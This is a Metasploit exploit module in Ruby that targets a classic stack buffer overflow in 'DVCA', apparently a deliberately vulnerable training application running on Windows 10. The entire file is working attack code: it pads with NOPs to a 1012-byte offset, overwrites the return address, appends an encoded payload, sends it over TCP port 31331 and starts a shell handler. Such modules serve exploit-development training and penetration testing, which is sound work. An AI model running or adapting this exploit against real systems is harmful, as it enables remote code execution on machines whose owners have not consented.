##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DVCA Classic Buffer Overflow',
      'Description'    => %q{
          This module exploits a classic buffer overflow in the DVCA.
        },
      'Author'   =>
        [
          'fokt',  # Original exploit author
          'fokt'   # MSF module author
        ],
      'License'        => MSF_LICENSE,
      'Payload'        =>
        {
          'Space'    => 1000,
          'BadChars' => "\x00"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows 10', {'Ret' => 0x133712f0, 'Offset' => 1012} ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'SRVHOST' => '0.0.0.0',
          'EXITFUNC' => 'thread'
        },
      'DisclosureDate' => 'Aug 01 2018',
      'DefaultTarget'  => 0))

    register_options [ OptPort.new('RPORT', [ true, 'The DVCA port to listen on', 31331 ]) ]
  end

  def exploit
	connect
	junk = make_nops(target['Offset'])
	sploit = junk + [target['Ret']].pack('V') + payload.encoded
	sock.put(sploit)
	
	handler
	disconnect
  end

end